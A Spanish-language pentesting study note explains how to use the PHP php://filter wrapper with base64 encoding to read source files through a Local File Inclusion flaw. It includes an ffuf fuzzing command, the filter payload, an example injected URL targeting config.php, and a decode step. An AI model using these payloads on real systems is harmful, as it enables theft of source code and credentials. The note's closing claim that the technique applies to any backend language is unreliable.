---
tags:
  - webapp
  - LFI
  - fuzzing
  - RCE
---
## Conceptos Clave (TL;DR)

* Los PHP Wrappers permiten acceder a flujos de I/O a nivel de aplicación, extendiendo el impacto de vulnerabilidades como LFI y XXE para leer código fuente o lograr RCE.

* La inclusión local estándar de un archivo PHP hace que el servidor lo ejecute, resultando usualmente en una pagina renderizada o un output vacio.

* El wrapper `php://filter` con el filtro de conversión `convert.base64-encode` codifica el archivo base antes de su procesamiento, evitando su ejecución y revelando el código fuente de la aplicación.

  

## Herramientas Clave

* **ffuf / gobuster**: Para fuzzing y descubrimiento de paginas PHP expuestas u ocultas en el servidor web.

* **base64**: Utilidad nativa de lineal de comandos en Linux para decodificar el payload extraído.

  

## Metodología Paso a Paso

* **Fase 1: Descubrimiento y Fuzzing**: Buscar archivos PHP interactuando con la aplicación o mediante fuerza bruta de directorios. Es critico no limitarse a respuestas exitosas, ya que archivos restringidos externamente pueden ser leídos internamente a través de LFI.

* **Fase 2: Intercepcion e Inyeccion**: Una vez detectado un parámetro vulnerable a LFI, se reemplaza el payload convencional por el wrapper de filtro PHP para evitar que el archivo objetivo se ejecute al ser llamado.

* **Fase 3: Extracción de Código**: Especificar en el parámetro `resource` del wrapper el archivo objetivo que deseamos auditar (ej. archivos de configuración o index).

* **Fase 4: Decodificación y Pivoteo**: Tomar la cadena base64 devuelta en la respuesta HTTP, decodificarla localmente para leer el código y analizarlo en busca de credenciales, llaves de base de datos, lógica de validación oculta o nuevos archivos a los cuales apuntar el LFI.


## Cheat Sheet de Comandos

```bash
# Fuzzing de archivos PHP para identificar vectores potenciales.

# -w: Diccionario a utilizar.
# -u: URL objetivo con la palabra clave FUZZ apuntando al archivo y su extension.

ffuf -w <directory_diccionario>:FUZZ -u http://<TARGET_IP>:<PORT>/FUZZ.php
```

```python
# Payload HTTP para inyectar en el parametro vulnerable a LFI.

# filter/: Invoca el wrapper de filtros.
# read=convert.base64-encode: Aplica el filtro de codificacion al input.
# resource=<FILE>: Define el archivo especifico a leer.

php://filter/read=convert.base64-encode/resource=<FILE>
```

```python
# Ejemplo de payload en la URL (asumiendo que la app concatena .php automaticamente)

http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config.php
```

```bash
# Decodificar el resultado obtenido del servidor web.

# echo: Imprime la cadena codificada obtenida.
# -d: Bandera de base64 para realizar la accion de decodificacion.

echo '<BASE64_ENCODED_STRING>' | base64 -d
```


## "Gotchas" y Troubleshooting

* **Sufijos ocultos**: Si la aplicación web añade automáticamente la extensión `.php` al final de tu input (ej. `include($_GET['language'] . ".php");`), NO incluyas la extensión `.php` en tu parámetro `resource`. Utiliza `resource=config` en lugar de `resource=config.php`.

* **Cadenas truncadas**: Asegúrate de copiar la cadena base64 completa desde el servidor. A veces el renderizado del navegador corta el output. Visualiza el código fuente de la pagina en el navegador (Ctrl+U) para garantizar que copiaste la cadena intacta; de lo contrario, fallara la decodificación.

* **Fuzzing de respuestas de error**: Al hacer fuzzing inicial de archivos, no filtres ni ignores los códigos HTTP `301`, `302` o `403`. Dado que estarás leyendo estos archivos desde el backend via LFI (como localhost), las restricciones o redirecciones del frontend no aplican.

* **Comportamiento general**: Esta técnica aplica para cualquier lenguaje de backend vulnerable (no solo PHP) en escenarios donde la función vulnerable intenta ejecutar el archivo por defecto en lugar de simplemente leer su texto plano.